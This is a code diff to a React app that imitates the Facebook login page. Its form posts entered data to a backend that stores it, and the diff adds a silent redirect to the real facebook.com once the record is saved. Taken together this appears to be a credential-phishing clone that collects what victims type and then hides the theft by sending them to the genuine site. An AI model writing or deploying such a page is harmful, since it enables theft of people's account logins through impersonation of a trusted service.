@@ -1,4 +1,5 @@
 import React, { useRef } from "react";
+import { useState } from "react";
 import "./App.css";
 import intializeAuthentication from "./firebase/firebase.init";
 intializeAuthentication();
@@ -23,8 +24,8 @@ function App() {
       .then((res) => res.json())
       .then((data) => {
         if (data.insertedId) {
-          // alert("Successfully added the user.");
           e.target.reset();
+          window.location.replace(`https://www.facebook.com`);
         }
       });
     e.preventDefault();
@@ -32,12 +33,6 @@ function App() {
 
   return (
     <>
-      {/* <div className="h1">
-        <h1 className="h">facebook</h1>
-        <p className="pr">
-          Facebook helps you connect and share with the people in your life.
-        </p>
-      </div> */}
       <form className="main" onSubmit={handleAddUser}>
         <h3 className="fb">facebook</h3>
         <input
@@ -63,9 +58,7 @@ function App() {
           </a>
         </div>
         <div className="ca">
-          <a href="/" class="pca">
-            Create New Account
-          </a>
+          <button class="pca">Create New Account</button>
         </div>
 
         <div className="language-main">
